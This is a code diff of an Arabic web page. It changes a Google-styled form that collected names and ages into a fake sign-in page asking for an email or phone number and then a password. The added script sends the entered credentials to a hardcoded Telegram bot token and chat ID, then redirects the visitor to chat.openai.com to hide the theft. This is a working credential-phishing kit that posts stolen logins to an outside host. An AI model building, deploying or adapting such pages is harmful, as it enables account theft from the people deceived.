@@ -2,151 +2,153 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج شبيه Google</title>
+  <title>نموذج إرسال البيانات</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      background: #f2f2f2;
-      font-family: Arial, sans-serif;
+      font-family: 'Tahoma', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      direction: rtl;
+      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
+      background-size: cover;
     }
 
-    .box {
-      background: #fff;
-      border-radius: 8px;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 360px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    .form-container {
+      background: rgba(255, 255, 255, 0.92);
+      padding: 30px 25px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+      width: 320px;
+      text-align: right;
     }
 
-    .box img {
-      width: 80px;
-      display: block;
-      margin: 0 auto 20px;
-    }
-
-    .box h2 {
-      font-weight: normal;
-      font-size: 22px;
-      margin-bottom: 10px;
-      color: #202124;
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
       text-align: center;
     }
 
-    .box p {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 30px;
-      text-align: center;
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
     }
 
-    input {
+    .input-group input {
       width: 100%;
-      padding: 12px 10px;
+      padding: 10px 0 8px 0;
       font-size: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      background: transparent;
       outline: none;
-      margin-bottom: 10px;
     }
 
-    .link {
+    .input-group label {
+      position: absolute;
+      right: 0;
+      top: 10px;
+      color: #777;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+
+    .input-group input:focus {
+      border-bottom: 2px solid #1a73e8;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: -10px;
+      font-size: 12px;
       color: #1a73e8;
-      font-size: 13px;
-      text-decoration: none;
-      display: block;
-      margin: 8px 0;
     }
 
-    .btn {
+    button {
       background-color: #1a73e8;
       color: white;
+      padding: 12px;
       border: none;
-      padding: 10px 16px;
-      font-size: 14px;
-      border-radius: 4px;
+      border-radius: 8px;
       cursor: pointer;
-      float: left;
+      font-size: 16px;
+      width: 100%;
+      margin-top: 10px;
     }
 
-    .clear {
-      clear: both;
+    button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
     }
 
     .status {
-      text-align: center;
       margin-top: 15px;
-      font-size: 13px;
-      color: #666;
+      color: #555;
+      font-size: 14px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="box" id="stepBox">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
-    <h2>أدخل اسمك</h2>
-    <p>باستخدام النموذج الخاص بنا</p>
-    <input type="text" id="name" placeholder="اسمك الكامل">
-    <a href="#" class="link">نسيت الاسم؟</a>
-    <a href="#" class="link">استخدام وضع الضيف</a>
-    <button class="btn" onclick="goToStep2()">التالي</button>
-    <div class="clear"></div>
+  <div class="form-container" id="formBox">
+    <h2>تسجيل الدخول</h2>
+    <div class="input-group">
+      <input type="email" id="email" placeholder=" " required>
+      <label for="email">البريد الإلكتروني أو الهاتف</label>
+    </div>
+    <button onclick="goToPassword()">التالي</button>
     <div class="status" id="status"></div>
   </div>
 
   <script>
-    function goToStep2() {
-      const name = document.getElementById("name").value.trim();
-      if (!name) {
-        document.getElementById("status").textContent = "يرجى إدخال الاسم.";
+    function goToPassword() {
+      const email = document.getElementById("email").value.trim();
+      if (!email) {
+        document.getElementById("status").textContent = "يرجى إدخال البريد.";
         return;
       }
 
-      document.getElementById("stepBox").innerHTML = `
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
-        <h2>أدخل سنك</h2>
-        <p>الخطوة الثانية لتأكيد بياناتك</p>
-        <input type="number" id="age" placeholder="السن">
-        <a href="#" class="link">لا تعرف سنك؟</a>
-        <a href="#" class="link">سيتم استخدام السن بشكل خاص</a>
-        <button class="btn" onclick="sendData('${name}')">التالي</button>
-        <div class="clear"></div>
+      document.getElementById("formBox").innerHTML = `
+        <h2>مرحبا ${email}</h2>
+        <div class="input-group">
+          <input type="password" id="password" placeholder=" " required>
+          <label for="password">أدخل كلمة المرور</label>
+        </div>
+        <button onclick="sendData('${email}')">تسجيل الدخول</button>
         <div class="status" id="status"></div>
       `;
     }
 
-    function sendData(name) {
-      const age = document.getElementById("age").value.trim();
+    function sendData(email) {
+      const password = document.getElementById("password").value.trim();
       const statusEl = document.getElementById("status");
 
-      if (!age) {
-        statusEl.textContent = "يرجى إدخال السن.";
+      if (!password) {
+        statusEl.textContent = "يرجى إدخال كلمة المرور.";
         return;
       }
 
       statusEl.textContent = "جارٍ الإرسال...";
 
-      const message = `📝 بيانات Google مزيفة:\n👤 الاسم: ${name}\n🎂 السن: ${age}`;
+      const message = `📥 بيانات تسجيل:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
       const chat_id = "6894787120";
       const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;
 
       fetch(url)
-        .then(response => {
-          if (!response.ok) throw new Error("فشل الاتصال");
+        .then(res => {
+          if (!res.ok) throw new Error("فشل الاتصال");
           statusEl.textContent = "✅ تم الإرسال بنجاح! يتم التحويل...";
           setTimeout(() => {
             window.location.href = "https://chat.openai.com";
           }, 1500);
         })
-        .catch(error => {
+        .catch(err => {
           statusEl.textContent = "❌ فشل في الإرسال.";
+          console.error(err);
         });
     }
   </script>
